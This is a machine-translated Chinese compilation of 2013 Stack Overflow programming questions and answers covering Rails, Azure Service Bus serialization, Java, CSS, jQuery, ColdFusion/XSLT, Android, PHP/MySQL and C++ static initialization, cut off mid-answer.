javascript 中的第二种方法只有我想看到的“硬编码”html。我知道这远非最佳实践，但我只想看到它起作用。几天前，当我将此 html 硬编码到我的视图中时，我有部分功能。然后我会使用`<% thing = Thing.new() %>`显然只在我第一次单击按钮时才有效。

有人能帮我吗？我注意到 Rails 有很多内置的 ajax 功能，并且必须有一个简单的方法来做到这一点。

## 更新

我想到了一个更好的方法来问这个问题：我正在寻找有关如何调用另一个控制器的操作的指导，这通常会在新窗口中打开一个表单，并将该表单显示在另一个控制器页面上的容器中。我不知道是否需要创建另一个动作，如果需要，是否需要在控制器“1”或“2”中。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-18T13:35:29.487

我会避免混合 erb 和 javascript，它很少需要，如果你想使用它，你需要添加 js.erb 扩展

只需拼出 URL 而不是调用 url 助手：

```
$("#newCampaignButton2").on('click', function () {
  $('#newThingFormTab').load('/things/start.js');
)}; 
```

它将结果加载`/things/start.js`到`#newThingFormTab`

在控制器操作中，您可能希望跳过为 AJAX 请求呈现布局。这就是我添加`.js`扩展的原因，它使操作能够以不同的方式响应不同的格式。

```
def start
  @thing = Thing.new
  respond_to do |format|
    format.html # render start.html
    format.js { render 'start.html', :layout => false }
  end
end 
```

# ruby-on-rails - 单表继承子类不存在

> ID：15443607
> 
> 赞同：1
> 
> 时间：2013-03-15T23:17:39.697
> 
> 标签：ruby-on-rails

我正在尝试使用关联表以及单表继承（'STI'）。我有一个男人、女人和一个关系模型。关系模型有一个类型列，因此我可以使用 STI。我还创建了一个继承自 Relationship 的 Friend 模型，因为 Friend 将是一种关系。

曼.rb

```
 attr_accessible :name
   has_many :relationships
   has_many :women, :through => :relationships 
```

女人.rb

```
attr_accessible :name
has_many :relationships
has_many :men,  :through => :relationships 
```

在聚会模型中，我还希望跟踪日期发生的时间和地点。

关系.rb

```
 attr_accessible :type
   belongs_to :woman
   belongs_to :man 
```

朋友.rb

```
class Friend < Relationship

end 
```

但是，当我尝试与类型朋友创建关系时，我收到子类不存在的警告消息。在控制台中，我正在这样做

```
 sarah = Woman.create!(name: 'Sarah')
     jim = Man.create!(name: 'Jim')

     jim.relationships.build(type: 'Friend', woman_id: 1)
=> #<Relationship id: nil, type: "Friend", man_id: 1, woman_id: 1, created_at: nil, updated_at: nil>

     jim.save! 
```

但是当我试图为吉姆拉起关系时，我得到了

```
>> jim.relationships
  Relationship Load (0.3ms)  SELECT "relationships".* FROM "relationships" WHERE "relationships"."man_id" = 1
ActiveRecord::SubclassNotFound: The single-table inheritance mechanism failed to locate the subclass: 'friends'. This error is raised because the column 'type' is reserved for storing the class in case of inheritance. Please rename this column if you didn't intend it to be used for storing the inheritance class or overwrite Relationship.inheritance_column to use another column for that information. 
```

当我尝试与“朋友”而不是“朋友”建立关系时也是如此

```
 jim.relationships.build(type: 'friends', woman_id: 1) 
```

你能解释一下我做错了什么吗？

我没有在数据库中为朋友创建表。我认为一切都可以存储在关系模型中。由于这只是一个游戏应用程序，我只为关系模型分配了 type 属性。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-15T23:48:44.760

我认为类型值需要是小写和单数 - `friend`？

但实际上您可能想要使用这些对象并让 Rails 为您处理

```
sarah = Woman.create!(name: 'Sarah')
jim = Man.create!(name: 'Jim')
Friend.create!(women: sarah, man: jim) 
```

男人女人模型对我来说没有意义 - 他们既是一个人，一个关系应该只有两个人，无论性别如何

# .net - BrokeredMessage 发送/解析消息 序列化 POCO

> ID：15443610
> 
> 赞同：1
> 
> 时间：2013-03-15T23:17:48.107
> 
> 标签：.net, azureservicebus

我正在注册特定消息，当收到呼叫特定事件时。

我看到 BrokeredMessage 接受一个对象，我知道我需要为所有消息实现 ISerializable 。

Hpwever，我的消息是普通的 POCO 对象，我想探索按原样使用它们的可能性：

```
public class CustomerOrderEvent
{
   int orderId;
   int quantity;
   double value;
} 
```

在接收期间，我会：

1.  检索消息并返回对象类型
2.  查找我的地图，调用已注册此事件消息的事件

虽然描述起来很简单，但第一步就是把我的头发拉出来。

是否有任何框架可以通过 Azure 总线为我包装这个？

如果使用 IoC，理想情况下我希望能够使用我最喜欢的注射器 SimpleInjector - 如果直接定义适配器，这将不是问题。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-16T17:21:10.150

在某些时候，您必须有一个带有 , 等属性的类`DataContract`才能`DataMember`发送到`DataContactSerializer`. 但是，您不必将它们添加到您的 POCO。

一种选择是简单地创建一个 DTO，使用与 POCO 相同的数据填充该 DTO。这个 DTO 你会用`BrokeredMessage`. 或者，您可以简单地将您的 POCO 以某种方式序列化为 a`Stream`并将其提供给 a`BrokeredMessage`

另一种方法是使用 .NET 序列化所称的“代理”（与 DTO 大致相同）。这要求您不仅要定义代理项，还要定义`IDataContractSurrogate`在手动创建`DataContractSerializer`.

首先，我假设您真正拥有的是具有公共属性的 POCO，而不是您发布的具有私有字段的 POCO。有了它，您可以创建一个代理：

```
[DataContract(Name = "CustomerOrderEvent", Namespace = "http://www.mynamespace.com")]
public class CustomerOrderEventSurrogate
{
    [DataMember]
    public int OrderId { get; set; }

    [DataMember]
    public int Quantity { get; set; }

    [DataMember]
    public double Value { get; set; }
} 
```

...直截了当，在此示例中，与具有所有必要属性的 POCO 相同。然后定义一个`IDataContractSurrogate`实现：

```
public class DataContractSurrogate : IDataContractSurrogate
{
    public Type GetDataContractType(Type type)
    {
        if (typeof (CustomerOrderEvent).IsAssignableFrom(type))
        {
            return typeof (CustomerOrderEventSurrogate);
        }
        return type;
    }

    public object GetObjectToSerialize(object obj, Type targetType)
    {
        var customerOrderEvent = obj as CustomerOrderEvent;
        if (customerOrderEvent == null) return obj;

        var surrogate =
            new CustomerOrderEventSurrogate
                {
                    OrderId = customerOrderEvent.OrderId,
                    Quantity = customerOrderEvent.Quantity,
                    Value = customerOrderEvent.Value
                };
        return surrogate;
    }

    public object GetDeserializedObject(object obj, Type targetType)
    {
        var surrogate = obj as CustomerOrderEventSurrogate;
        if (surrogate == null) return obj;

        var customerOrderEvent =
            new CustomerOrderEvent()
                {
                    OrderId = surrogate.OrderId,
                    Quantity = surrogate.Quantity,
                    Value = surrogate.Value
                };
        return customerOrderEvent;
    }

    public object GetCustomDataToExport(MemberInfo memberInfo, Type dataContractType)
    {
        throw new NotImplementedException();
    }

    public object GetCustomDataToExport(Type clrType, Type dataContractType)
    {
        throw new NotImplementedException();
    }

    public void GetKnownCustomDataTypes(Collection<Type> customDataTypes)
    {
        throw new NotImplementedException();
    }

    public Type GetReferencedTypeOnImport(string typeName, string typeNamespace, object customData)
    {
        throw new NotImplementedException();
    }

    public CodeTypeDeclaration ProcessImportedType(CodeTypeDeclaration typeDeclaration, CodeCompileUnit compileUnit)
    {
        throw new NotImplementedException();
    }
} 
```

这里我们抛出`NotImplementedException`可选方法。这个实现实现`GetDataContractType`告诉调用者它支持`CustomerOrderEvent`并`CustomerOrderEventSurrrogate`在序列化时使用。它还实现`GetObjectToSerialize`了`GetDeserializeObject`从代理到 POCO 的来回映射。

现在，您只需创建一个知道您要使用的实现`BrokeredMessage`的实例。例如：`DataContractSerializer``IDataContractSurrogate`

```
var customerOrderEvent = new CustomerOrderEvent
                                {
                                    OrderId = 1,
                                    Quantity = 1,
                                    Value = 1.99
                                };

var dataContractSerializer =
    new DataContractSerializer(typeof (CustomerOrderEvent),
                                new[] {typeof (CustomerOrderEvent)},
                                int.MaxValue,
                                true,
                                true,
                                new DataContractSurrogate());

var message = new BrokeredMessage(customerOrderEvent, dataContractSerializer); 
```

并且当您收到消息时，您可以将`DataContractSerializer`对象传递给`GetBody`方法。例如：

```
message.GetBody<CustomerOrderEvent>(dataContractSerializer); 
```

...假设对话的这一方与另一方做了所有相同的事情（具有代理类，`IDataContractSurrogate`实现并`dataContractSerializer`正确创建。）

# java - Java抽象类——找不到符号——方法错误

> ID：15443613
> 
> 赞同：3
> 
> 时间：2013-03-15T23:17:55.950
> 
> 标签：java, methods, compiler-errors, abstract-class, abstract

我是`Java`编程新手，需要一些帮助。我有一个带有一个非抽象方法和一个抽象方法的抽象类。从抽象类（A类）中，我通过使用`"this.getSize();"`（我理解`"this"`是指调用该方法的对象类型。所以在这种情况下为-B）调用子类（B类）的方法，但我收到一条错误消息这在尝试编译 A 类时：

```
" Cannot find symbol - method getSize() " 
```

我在想这可能是因为我从抽象方法中调用它，但我不确定。请帮忙..谢谢。

**这是我的代码**：

```
abstract class A{

    public int size()
    {
        return this.getSize();
    }

    //abstract method
    abstract void grow(int f);
}

class B extends A{
    private int size = 1; //default set of size

    public int getSize(){ return size; }

    public void grow(int factor)
    {
        size = size * factor;
    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-15T23:19:36.250

超类不能引用实现类的方法。您需要声明`getSize`为抽象方法。

**一类**

```
abstract class A {

    public int size() {
        return this.getSize();
    }

    abstract public int getSize();

    // abstract method
    abstract void grow(int f);

} 
```

**B类**

```
class B extends A {
    private int size = 1; // default set of size

    public int getSize() {
        return size;
    }

    public void grow(int factor) {
        size = size * factor;
    }

    public static void main(String[] args) {
        B b = new B();
        System.out.println(b.getSize()); //Prints 1
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-15T23:20:32.913

您没有`getSize()`在`A`. 我想你的意思是`abstract`在`A`.

```
public abstract int getSize(); 
```

然后你可以调用该方法。

# html - CSS 中带有页眉和页脚的 3 列（100%）布局的困难

> ID：15443618
> 
> 赞同：0
> 
> 时间：2013-03-15T23:18:16.347
> 
> 标签：html, css, height

我正在处理一个将在整个网站周围使用“自定义”边框的主页。

这就是我想用我的 div 实现的目标。

```
[LEFT-TOP-BORDER   ][MIDLLE-TOP-BORDER   ][RIGHT-TOP-BORDER   ]
[LEFT-MIDDLE-BORDER][Content             ][RIGHT-MIDDLE-BORDER]
[LEFT-BOTTOM-BORDER][MIDLLE-BOTTOM-BORDER][RIGHT-BOTTOM-BORDER] 
```

*   所有边框角（左/右顶部和底部边框）具有固定的宽度和高度。
*   中间顶部/底部边框具有固定高度，但应扩展到站点的整个宽度。
*   中间的左右边框有一个固定的宽度，但即使内容变大也应该填满屏幕的整个高度。
*   边框应远离内容 div，因此如果窗口太小，则不应位于内容 div 上。
*   内容 div 将具有固定的宽度和高度。
*   当窗口很小时，我希望页脚保持粘性而不会再次重叠内容 div。

希望很清楚我想做什么！

我几乎让它工作，但我遇到了左/右中边框的问题。**[在这里](http://jsfiddle.net/SuchJ/)**查看自己

正如您所看到的，当窗口变小时，边框与内容 div 重叠。

但我认为我这样做的方式不好？

我该怎么做？

先谢谢了！

亲切的问候亚历克斯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-16T00:48:33.637

查看您的代码您需要做的是将您的 div 放在彼此内部，而不是彼此相邻。所以你的中间部分将是：

```
<div class="middle-left">
    <div class="middle-right">
        <div class="middle-content">
            Content
        </div>
    </div>
</div> 
```

然后给你的左中左填充正确宽度并将背景放置在左边，中右一些正确宽度的右填充并将背景放置在右边，然后随着你的内容变高，边距 div会自动展开。

对所有三层执行此操作，如下所示：

```
<div class="wrapper">
    <div class="top-left">
        <div class="top-right">
            <div class="top-content">
            </div>
        </div>
    </div>
    <div class="middle-left">
        <div class="middle-right">
            <div class="middle-content">
                 Content
            </div>
        </div>
    </div>
    <div class="bottom-left">
        <div class="bottom-right">
            <div class="bottom-content">
            </div>
        </div>
    </div>
</div> 
```

身体高度现在不需要你的 CSS 中的 100% 了。包装器可以居中，也不需要高度。我会尝试真正摆脱你所有的 CSS，并用这个新的 HTML 结构重新开始。只需添加填充和一些背景颜色即可。

# jquery - Jquery ajax 与父 ajax.done

> ID：15443619
> 
> 赞同：0
> 
> 时间：2013-03-15T23:18:35.217
> 
> 标签：jquery

如果嵌套在父 ajax 请求的 .done() 方法中，是否存在阻止 jquery ajax 调用正确执行的问题？嵌套 ajax 调用的 .done() 似乎没有被执行。非常感谢您提供的任何帮助。

```
var findNearestFacility = function () {
    var $form = $(this);
    var $addrsInput = $("form[data-ucw-ajaxNearestFacility] input.nearest-facility-input").attr('value')

    var geocoderInput = new google.maps.Geocoder();

    ////// calculate longitude and latitude for address entered in
    geocoderInput.geocode({ 'address': $addrsInput }, function (results, status) {

        if (status == google.maps.GeocoderStatus.OK) {

            latitudeUser = results[0].geometry.location.lat();
            longitudeUser = results[0].geometry.location.lng();

            var facilities = [];

            var facilitiesAndDistance = new Array();

            var options = {
                dataType: 'json',
                type: 'GET',
                url: '/Facilities/AllFacilities'
            };

            $.ajax(options).done(function (data1) {

                $.each(data1, function () {
                    this.ConcatAddress = this.StreetAddress1 + ", " + this.City + ", " + this.State + ", " + this.Zip;
                    facilities.push(this);
                });

                maxLengthFacilities = facilities.length;  // store max length of array

                var length = facilities.length;

                for (var indexFacility = 0; indexFacility < length; indexFacility++) {

                    var currentAddress = facilities[indexFacility].ConcatAddress;

                    geoCode(facilities[indexFacility], indexFacility, latitudeUser, longitudeUser);

                }

                var i = facilities;

                var facilitiesJson = $.toJSON(facilities);

                var options2 = {
                    url: "/Home/NearestFacilities",
                    type: 'POST',
                    dataType: 'json',
                    data: facilitiesJson
                };

                $.ajax(options2).done(function (returnData) {
                    // HELP!!
                    // CODE IN THIS BLOCK NEVER EXECUTES

                    alert('x');

                    //var $target = $($form.attr('data-ucw-target'));
                    //var $newHtml = $(data2);
                    //$target.replaceWith($newHtml);
                    //$target.effect('highlight');

                    //alert(data2);
                });

            })
        };
    });

    return false;
} 
```

更新：感谢您建议简化代码，因为它揭示了。下面是简化版。该测试按预期工作，因此问题变成了原始代码有什么问题。

```
var nestedAjexTest = function () {
        var options = {
            dataType: 'json',
            type: 'GET',
            url: '/Facilities/Ajax1'
        };

        $.ajax(options).done(function (data1) {
            alert("done1 " + data1);

            var options2 = {
                url: "/Facilities/Ajax2",
                type: 'POST',
                dataType: 'json',
                data: data1
            };

            $.ajax(options2).done(function (data2) {
                alert("done2 " + data2);
            })

        })

        return false;
    }; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-16T00:17:17.280

我花了一些时间研究这种情况，但我无法复制或诊断问题。请参阅以下使用延迟方法的嵌套 ajax 请求的工作示例。

```
$.ajax().done(function(){
   $.ajax().done(function() {
       console.warn('success');
   });
}); 
```

我建议删除您的代码片段，直到您的嵌套`done()`正确触发。地理编码器有可能会*以某种方式*干扰，但在等待 javascript 错误时，我不知道如何。

# xml - XSLT 使用 ColdFusion 在 URL 中传递两个参数

> ID：15443622
> 
> 赞同：1
> 
> 时间：2013-03-15T23:19:03.520
> 
> 标签：xml, xslt, coldfusion, parameters, hyperlink

我正在尝试使用 ColdFusion 通过 XSLT 文件中的 URL 传递两个参数。

这是我的 XSLT 代码：

```
<xsl:template match="/">
    <xsl:text>Actors: </xsl:text>
    <xsl:apply-templates select="/movies/movie/actors/actor/name"/>
</xsl:template>

<xsl:template match="name">
      <xsl:element name="a">
          <xsl:attribute name="href">actor_details.cfm?movieID=<xsl:value-of select="../../../@movieID"/>&amp;actorID=<xsl:value-of select="../@actorID"/></xsl:attribute>
          <xsl:value-of select="." />
      </xsl:element>
      <xsl:element name="br" />
</xsl:template> 
```

这是我的 actor_details.cfm 文件

```
<cfset MyXmlFile = Expandpath("test.xml")>
<cffile action="READ" variable="xmlInput"  file="#MyXmlFile#">
<cfset MyXslFile = Expandpath("actor_details.xsl")>
<cffile action="READ" variable="xslInput"  file="#MyXslFile#">

<cfset xslParam = StructNew() >
<cfset xslParam["movieID"] = "#url.movieID#" >

<cfset xmlOutput = XMLTransform(xmlInput, xslInput, xslParam )>
<!--- data is output --->
<cfcontent type="text/html" reset="yes">
<cfoutput>#xmloutput#</cfoutput> 
```

这是我的 actor_details.xsl 文件

```
<xsl:param name="movieID"/>

<xsl:template match="/">
    <title>Actor details</title>
    <xsl:apply-templates select="/movies/movie[@movieID=$movieID]/actors/actor[@actorID=$actorID]"/>
</xsl:template>

<xsl:template match="actor">
    <xsl:text>Name: </xsl:text>
    <xsl:value-of select="name"/>
    <xsl:element name="br"/>
    <xsl:text>Age: </xsl:text>
    <xsl:value-of select="age"/>
    <xsl:element name="br"/>
</xsl:template> 
```

所以根据通过 URL 传递的 movieID 和 actorID，actor_details 页面应该显示演员的姓名和年龄。我对 ColdFusion 很陌生，我不知道如何使用 ColdFusion 接收通过 URL 传递的参数。我在 actor_details.cfm 页面上遇到意外错误。

我认为问题出在 actor_details.cfm 页面的某个地方，但我就是不知道它是什么。

我的 XML 文件：

```
<movie movieID="1">
    <actors>
        <actor actorID="1"> 
            <name>Bob</name>
            <age>23</age>
        </actor>

        <actor actorID="2"> 
            <name>Jack</name> 
            <age>25</age>
        </actor>

        <actor actorID="3"> 
            <name>James</name>
            <age>38</age>
        </actor>
    </actors>   
</movie>

<movie movieID="2">
    <actors>
        <actor actorID="1"> 
            <name>Mike</name>
            <age>19</age>
        </actor>

        <actor actorID="2"> 
            <name>Daniel</name>
            <age>29</age>
        </actor>

        <actor actorID="3"> 
            <name>Phil</name> 
            <age>41</age>
        </actor>
    </actors>   
</movie> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-16T01:06:22.717

回答有关 URL 变量的问题。URL 是 CF 的变量范围之一，可以通过以下方式访问：

```
 <cfset myvar = #URL.actorid# > 
```

Of course you don't have to use the # signs on the right but since you're just learning it's a good way to identify your CF vars.

Here is a link to CF 9 docs and CF's built in [variable scopes](http://help.adobe.com/en_US/ColdFusion/9.0/CFMLRef/WSc3ff6d0ea77859461172e0811cbec173d0-7ffb.html).

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-16T13:16:12.213

I have fixed the problem by adding `<cfset xslParam["actorID"] = URL.actorID >` to my CFM file and `<xsl:param name="actorID"/>` to my XSL file.

# html - 指向节 id 的同一页面锚链接在 IE8 中不起作用

> ID：15443625
> 
> 赞同：2
> 
> 时间：2013-03-15T23:19:28.607
> 
> 标签：html, internet-explorer-8

我有一个带有导航的单页 HTML5 网站，应该将用户发送到该部分。在除 IE8 之外的所有浏览器中都运行良好，IE8 什么都不做。我所拥有的虚拟版本：

```
<a href="#about">About</a>
<a href="#work">Work</a>
<a href="#services">Services</a>
<a href="#process">Process</a>
<a href="#contact">Contact</a>

<section id="about">
...
</section>

<section id="work">
...
</section>

<section id="services">
...
</section>

<section id="process">
...
</section>

<section id="contact">
...
</section> 
```

没有运气进行了搜索。看到了一些关于向目标部分/div 添加不间断空格或一些文本的解决方案，但这不起作用。难住了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T23:32:24.730

首先，使用`name`而不是`id`（或者可能`name`以及`id`，如果您还需要将 id 用于其他用途）。

```
<section name="work"> 
```

其次，IE8 及更早版本不支持新的 HTML5 元素，例如`<section>`.

为了解决这个问题，您需要使用[html5shiv](https://code.google.com/p/html5shiv/)之类的 hack 。（或使用内置 html5shiv 的 Modernizr）[。](http://modernizr.com)

html5shiv 和 Modernizr 都是基于 Javascript 的。如果您出于某种原因不想或不能使用它们，那么您必须切换到使用 IE8 支持的 HTML 标签，例如`<div>`.

希望有帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-15T23:28:29.090

起初，Internet Explorer 8 不支持 HTML5，因此无法理解 section 标签。

第二点是，通常名称属性用于在站点上创建锚点。

您可以尝试将名称属性添加到您的部分标签，但我认为 IE 也不会理解这一点，因此您必须使用 div 或使用一些 javascript 解决方法。

# ruby-on-rails - Ruby on Rails，从控制器中的模型调用函数

> ID：15443629
> 
> 赞同：1
> 
> 时间：2013-03-15T23:19:41.480
> 
> 标签：ruby-on-rails, ruby

我的控制器中有以下方法：

```
def create
  p_attr=params[:upload]
  p_attr[:upload] = params[:upload][:upload].first if params[:upload][:arraydb].class == Array
  @upload = Upload.new(p_attr)

  respond_to do |format|
    if @upload.save
      @arraydb.process_name
    end
  end 
end 
```

在模型中，我有另一种方法可以处理刚刚保存的上传：

```
def self.process_name 
  update_attributes(:user_id => current_user.id)
  update_attributes(:defined => "no")
end 
```

它给了我一个错误，该方法`process_name`未定义`Upload`

有什么问题，如何从控制器更新模型中刚刚保存的文件的属性？提前致谢。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-15T23:48:33.270

在 Ruby 中，`self.`在名称前定义的方法是类方法。这意味着您只能在类本身上调用此类方法，而不能在其实例上调用。

这意味着：

```
upload = Upload.new()
upload.process_name 
```

导致错误

尽管：

```
Upload.process_name 
```

将调用该方法。

由于您真正想要做的是调用类`process_name`的实例，因此`Upload`您可以通过从方法定义中删除来更正代码`self.`，从而导致：

```
def process_name
    update_attributes(:user_id => current_user.id)
    update_attributes(:defined => "no")
end 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-15T23:37:49.833

它不是为*class*定义的，而不是为实例定义的。

您正在尝试在实例上调用它。使其成为实例方法。

# android - gainStyledAttributes 找不到数组

> ID：15443630
> 
> 赞同：3
> 
> 时间：2013-03-15T23:19:47.013
> 
> 标签：android, android-resources

我正在编写一个自定义 DialogPreference 并使用 2 个名为**entries**和**entryValues**的字符串数组设置首选项，这与 ListPreference 需要的类似。即使在使用 AttributeSet 参数调用我的构造函数时两个数组似乎都存在，但尝试通过 gainStyledAttributes 获取样式数组失败并返回 null。

我做错了什么，我该如何解决这个问题？

我的自定义类代码是：

```
public class BackgroundPicker extends DialogPreference {    

    private CharSequence[] mEntries;
    private CharSequence[] mEntryValues;

    public BackgroundPicker(Context context, AttributeSet attrs, int defStyle) {
        super(context, attrs, defStyle);

        // Print all values in attrs AttributeSet:
        for (int i=0;i<attrs.getAttributeCount();i++) {
            String name = attrs.getAttributeName(i);
            Object value  = attrs.getAttributeValue(i);
            Log.d(TAG, name + " : " + value + " of type " + value.getClass().getSimpleName());
        }

        TypedArray a = context.obtainStyledAttributes(attrs, R.styleable.ListPreference, 0, 0);

        // getIndexCount returns zero !
        for(int i=0; i<a.getIndexCount(); i++) {
            TypedValue v = a.peekValue(i);
            Log.d(TAG, "value[" + i + "] = " + v.toString());
        }

        // Both entries and entryValues are null.
        mEntries = a.getTextArray(R.styleable.ListPreference_entries);
        mEntryValues = a.getTextArray(R.styleable.ListPreference_entryValues);
    }
} 
```

我的调试打印是：

```
BackgroundPicker CTOR: IN
BackgroundPicker CTOR param attrs:
entries : @2131099650 of type String
title : @2131165247 of type String
key : BackgroundImage of type String
summary : @2131165248 of type String
defaultValue : back.png of type String
entryValues : @2131099651 of type String
BackgroundPicker CTOR param defStyle = 0
BackgroundPicker CTOR: OUT 
```

我在styles.xml 中的样式

```
<declare-styleable name="ListPreference">
    <attr name="entries" format="reference" />
    <attr name="entryValues" format="reference" />
</declare-styleable> 
```

我在arrays.xml 中的数据

```
<array name="Backgrounds">
    <item>back.png</item>
    <item>one.png</item>
</array> 
```

和我的偏好设置：

```
<PreferenceScreen xmlns:android="http://schemas.android.com/apk/res/android" >
    <PreferenceCategory android:title="@string/generaloptions" >
        <BackgroundPicker
            android:defaultValue="back.png"
            android:entries="@+array/Backgrounds"
            android:entryValues="@+array/Backgrounds"
            android:key="BackgroundImage"
            android:summary="@string/backgroundImageSummary"
            android:title="@string/backgroundImage" />
    </PreferenceCategory>
 </PreferenceScreen> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-16T10:16:59.523

带 + 号的值对我来说似乎很奇怪，我从未在我的设置中使用它们，也许这是不正确行为的主要原因。只需使用`android:entries="@array/Backgrounds"`没有`+`.

也尝试使用我的代码获取值，至少它适用于整数类型的属性，所以它也应该适用于其他类型：

```
TypedArray a = context.obtainStyledAttributes(attrs, new int[] { R.attr.entries, R.attr.entryValues });
mEntries = a.getTextArray(0); // because R.attr.entries has index 0 in the passed array
mEntryValues = a.getTextArray(1); 
```

# php - 显示数据库中具有相同 ID 的条目

> ID：15443636
> 
> 赞同：0
> 
> 时间：2013-03-15T23:21:02.087
> 
> 标签：php, mysql, arrays, while-loop

我有一个脚本，允许管理员查看客户已下的订单，他们可以在其中决定查看订单详细信息或删除订单。用户可以订购 1 件或多件商品，为此在数据库中创建的条目具有相同的 order_id，但具有不同的 product_id。当我显示我的订单时，这些重复的条目会出现，但是我只希望每个 order_id 有 1 个条目。下面是我的功能

```
function viewOrdersAdmin(){
//This block grabs the orders
$order_list = "";
//Selecting all the orders in the table from that member
$sql = mysql_query("SELECT * FROM `transactions`") or die(mysql_error());

while ($transactions = mysql_fetch_array($sql)) {
    //creating variables from the information
    $order_id = $transactions["order_id"];
    $mem_id = $transactions["mem_id"];

    $order_details = mysql_query("SELECT * FROM `transactionDetails` WHERE `order_id` = $order_id") or die(mysql_error());
    $orderDetailsCount = mysql_num_rows($order_details);
    while ($row = mysql_fetch_array($order_details)) {
        //creating variables from the information
        $order_product_id = $row["Product_ID"];

        $member_details = mysql_query("SELECT * FROM `members` WHERE `mem_id` = $mem_id") or die(mysql_error());
        $memberDetailsCount = mysql_num_rows($member_details);
        while ($row2 = mysql_fetch_array($member_details)) {
            //creating variables from the information
            $order_mem_fname = $row2["mem_first_name"];
            $order_mem_lname = $row2["mem_last_name"];

        $order_list .= "Order ID:$order_id - Customer Name: $order_mem_fname $order_mem_lname  &nbsp; &nbsp; &nbsp; <a href='manage_order.php?orderid=$order_id'>View</a> &bull; <a href='manage_orders.php?deleteid=$order_id'>Delete</a><br/>";

        }
    }
}

if (count($orderDetailsCount) == 0) {
    $order_list = "You have no orders to display";
}

print_r($order_list);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T23:22:30.913

```
SELECT *
FROM transactions
GROUP BY order_id 
```

# jquery - 没有回调金字塔的 JQuery 链接延迟

> ID：15443641
> 
> 赞同：3
> 
> 时间：2013-03-15T23:21:31.843
> 
> 标签：jquery, callback, jquery-deferred

有没有办法在没有回调金字塔的情况下链接 JQuery Deferreds 来一个接一个地执行？

现在我必须做这样的事情：

```
$.Deferred(function(dfd) {
    setTimeout(function() { 
        console.log('Foo'); 
        dfd.resolve(); 
    }, 1000);
})
.done(function() {
    $.Deferred(function(dfd) { 
        console.log('Bar');
        dfd.resolve();
    }).done(function() { 
         console.log('done');
    });
}); 
```

输出：Foo，Bar，完成

我希望能够做这样的事情：

```
$.Deferred(function(dfd) {
    setTimeout(function() { 
        console.log('Foo'); 
        dfd.resolve(); 
    }, 1000);
})
.then($.Deferred(function(dfd) { 
    console.log('Bar');
    dfd.resolve();
}))
.done(function() { console.log('done') }); 
```

不需要的输出：Bar、Foo、done

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T23:54:01.483

您的代码的问题是您正在传递`.then()`一个 jQuery 对象，而它需要一个`function`. 此代码根据需要执行 foo-bar-done。

```
$.Deferred(function(dfd) {
    setTimeout(function() { 
        console.log('Foo'); 
        dfd.resolve(); 
    }, 1000);
}).then(function(){ 
    return $.Deferred(function(dfd) { 
         console.log('Bar');
         dfd.resolve();
     });
}).done(function() { console.log('done') }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-01-21T22:16:45.613

我想你想使用[$.when()](http://api.jquery.com/jQuery.when/)。

像这样的东西应该工作：

```
var d1 = $.Deferred(function(dfd) {
    setTimeout(function() { 
        console.log('Foo'); 
        dfd.resolve(); 
    }, 1000);
});

var d2 = $.Deferred(function(dfd) { 
    setTimeout(function() { 
      console.log('Bar');
      dfd.resolve();
    }, 2000);
});

$.when(d1, d2).then(function() {console.log('done')}); 
```

# android - 为什么我收到错误“MyActivity 不是封闭类？”

> ID：15443646
> 
> 赞同：5
> 
> 时间：2013-03-15T23:22:16.953
> 
> 标签：android, android-intent

我有一个以以下类开头的 libgdx 程序：

```
public class MyActivity extends AndroidApplication implements IActivityRequestHandler 
```

我需要有一个`Activity`类来检测屏幕尺寸`Display`（我不能在`AndroidApplication`课堂上这样做）。

所以我添加了以下类作为我的启动器`Activity`：

```
public class MyActivity1 extends Activity 
```

因此，在我的新课程中，`MyActivity1`我尝试运行我的旧课程`MyActivity`：

```
Intent myIntent = new Intent(MyActivity.this, MyActivity.class);
startActivity(myIntent); 
```

但我得到了以下编译错误：**MyActivity is not an enclosure class**

清单如下

```
<activity android:name=".MyActivity1"
    android:label="@string/app_name">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity>
<activity android:name=".MyActivity"/> 
```

为什么我会收到此错误？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2013-03-15T23:25:35.310

试试这个

```
 Intent myIntent = new Intent(MyActivity1.this, MyActivity.class);
  startActivity(myIntent); 
```

新的 Intent 需要当前活动的上下文（第一个参数）和您要初始化的类（第二个参数）。

# c++ - 强制在开始时评估函数内部的静态常量？

> ID：15443647
> 
> 赞同：1
> 
> 时间：2013-03-15T23:22:26.087
> 
> 标签：c++, function, c++11, static, operator-precedence

考虑以下程序：[LWS](http://liveworkspace.org/code/19YWtS%242)

```
#include <iostream>
#include <chrono>

void test()
{
   static const std::chrono::high_resolution_clock::time_point marker 
   = std::chrono::high_resolution_clock::now();
   std::cout<<marker.time_since_epoch().count()<<std::endl;
}

int main(int argc, char* argv[])
{

    std::cout<<std::chrono::high_resolution_clock::now()
    .time_since_epoch().count()<<std::endl;
    std::cout<<"--------"<<std::endl;
    test();
    std::cout<<"--------"<<std::endl;
    test();
    return 0;
} 
```

使用 g++，结果是：

```
1363389335665993
--------
1363389335666701
--------
1363389335666701 
```

这意味着，函数`marker`内部的静态常量`test()`在第一次调用该函数时被评估。有没有办法或技巧（除非声明`marker`为全局变量）`marker`在程序开始时强制评估？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-15T23:30:59.103

